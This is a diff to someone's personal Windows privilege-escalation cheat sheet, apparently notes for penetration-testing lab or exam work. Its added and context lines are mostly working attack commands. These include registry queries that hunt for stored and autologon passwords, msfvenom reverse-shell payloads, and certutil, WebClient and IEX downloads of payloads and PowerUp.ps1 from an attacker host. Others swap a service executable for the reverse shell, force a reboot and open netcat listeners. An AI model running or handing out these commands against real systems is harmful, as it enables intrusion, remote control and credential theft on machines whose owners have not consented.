@@ -231,8 +231,6 @@ reg query HKCU /f password /t REG_SZ /s
 Autologon Creds 
  
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
- 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername" 
  
   
@@ -279,6 +277,24 @@ msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 LHOST=192
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')" 
 shutdown -r -t 10 && exit 
 nc -nvlp 444
+
+=================================== 
+Powerup to find Exploitable Service
+
+cd ~/lab/
+cp ~/tools/privesc_windows/PowerUp.ps1 . 
+webup 80 
+certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
+powershell.exe -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
+webup 80 
+certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
+cd C:\xampp\fz\ 
+move fz.exe fz.old 
+move C:\xampp\upload\mike80.exe fz.exe 
+shutdown -r
+nc -nvlp 80
+
 
 ================================== 
 DLL Hijack
@@ -351,7 +367,11 @@ PowerUp
 ALL common Windows privesc (bypassuac, service-abuse, gpp-passwords, tokens) 
 Dev branch has extra checks – Can find 'SeImpersonatePrivilege' tokens too 
 Look for services running as 'System'. 
- 
+
+webup 80
+certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
+powershell.exe -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
+
 powershell.exe -nop -ExecutionPolicy bypass  
 IEX(New-Object Net.WebClient).downloadString('http://192.168.162.46:80/PowerUp.ps1') 
 Import-Module .\PowerUp.ps1 
@@ -477,5 +497,5 @@ type proof.txt && whoami && hostname && ipconfig
  
 ================================== 
 Consider
-mxsam mxpivot mxtransfer
+mxsam mxpivot mxtransfer mxad
 
